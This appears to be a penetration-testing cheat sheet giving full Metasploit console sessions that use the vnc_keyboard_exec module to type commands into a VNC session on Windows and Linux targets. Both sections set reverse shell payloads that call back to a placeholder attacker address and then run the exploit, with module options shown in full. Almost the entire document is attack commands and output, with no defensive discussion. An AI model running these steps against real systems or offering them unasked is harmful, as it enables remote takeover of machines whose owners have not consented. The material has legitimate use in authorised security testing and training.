# Metasploit

## 01 - Windows

```
msf > use exploit/multi/vnc/vnc_keyboard_exec

msf exploit(multi/vnc/vnc_keyboard_exec) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(multi/vnc/vnc_keyboard_exec) > options

Module options (exploit/multi/vnc/vnc_keyboard_exec):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   PASSWORD                             no        The VNC password
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT               5900             yes       The target port (TCP)
   SSL                 false            no        Negotiate SSL for incoming connections
   SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
   TIME_KBD_DELAY      50               yes       Delay in milliseconds when typing long commands (0 to disable)
   TIME_KBD_THRESHOLD  50               yes       How many keystrokes between each delay in long commands
   TIME_WAIT           20               yes       Time to wait for payload to be executed
   URIPATH                              no        The URI to use for this exploit (default is random)


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or
                                        0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   VNC Windows / Powershell



View the full module info with the info, or info -d command.

msf exploit(multi/vnc/vnc_keyboard_exec) > set rhosts <target_IP>

msf exploit(multi/vnc/vnc_keyboard_exec) > set rport <target_PORT>

msf exploit(multi/vnc/vnc_keyboard_exec) > set password <password>

msf exploit(multi/vnc/vnc_keyboard_exec) > set lhost <attacker_IP>

msf exploit(multi/vnc/vnc_keyboard_exec) > set lport <attacker_PORT>

msf exploit(multi/vnc/vnc_keyboard_exec) > run
```

## 02 - Linux

```
msf > use exploit/multi/vnc/vnc_keyboard_exec

msf exploit(multi/vnc/vnc_keyboard_exec) > set target 2

msf exploit(multi/vnc/vnc_keyboard_exec) > set payload cmd/unix/python/shell_reverse_tcp

msf exploit(multi/vnc/vnc_keyboard_exec) > options

Module options (exploit/multi/vnc/vnc_keyboard_exec):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   PASSWORD                             no        The VNC password
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                               yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT               5900             yes       The target port (TCP)
   SSL                 false            no        Negotiate SSL for incoming connections
   SSLCert                              no        Path to a custom SSL certificate (default is randomly generated)
   TIME_KBD_DELAY      50               yes       Delay in milliseconds when typing long commands (0 to disable)
   TIME_KBD_THRESHOLD  50               yes       How many keystrokes between each delay in long commands
   TIME_WAIT           20               yes       Time to wait for payload to be executed
   URIPATH                              no        The URI to use for this exploit (default is random)


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or
                                        0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (cmd/unix/python/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   VNC Linux / Unix



View the full module info with the info, or info -d command.

msf exploit(multi/vnc/vnc_keyboard_exec) > set rhosts <target_IP>

msf exploit(multi/vnc/vnc_keyboard_exec) > set rport <target_PORT>

msf exploit(multi/vnc/vnc_keyboard_exec) > set password <password>

msf exploit(multi/vnc/vnc_keyboard_exec) > set lhost <attacker_IP>

msf exploit(multi/vnc/vnc_keyboard_exec) > set lport <attacker_PORT>

msf exploit(multi/vnc/vnc_keyboard_exec) > run
```

---
## References

- [Sending Keystrokes to Your (Virtual) Machines using X, Vnc , Rdp or Native ways](https://web.archive.org/web/20220712164101/https://www.jedi.be/blog/2010/08/29/sending-keystrokes-to-your-virtual-machines-using-X-vnc-rdp-or-native/)